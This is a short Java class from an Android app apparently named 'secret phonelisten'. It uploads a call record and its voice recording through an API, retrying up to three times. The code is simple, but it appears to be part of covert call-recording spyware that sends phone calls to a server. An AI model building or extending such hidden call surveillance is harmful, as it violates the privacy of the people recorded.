package com.comsince.secret.phonelisten.service;

import android.util.Log;

import com.comsince.secret.phonelisten.model.Record;
import com.comsince.secret.service.API;

import java.io.File;

/**
 * Created by liaojinlong on 14-11-11.
 */
public class ActionReporter implements Runnable {
    Record record;
    File voicefile;
    private int retryTime = 3;

    public ActionReporter(Record record,File voicefile){
        this.record = record;
        this.voicefile = voicefile;
    }

    @Override
    public void run() {
        Log.i("CallBroadcastReceiver","***************CallBroadcastReceiver--开始上传"+record.getType()+"记录");
        String result= "500";
        while (retryTime > 0 && !result.equals("200")){
            result= API.syncRecord(record, voicefile);
            retryTime --;
            Log.i("CallBroadcastReceiver",result);
        }
    }
}
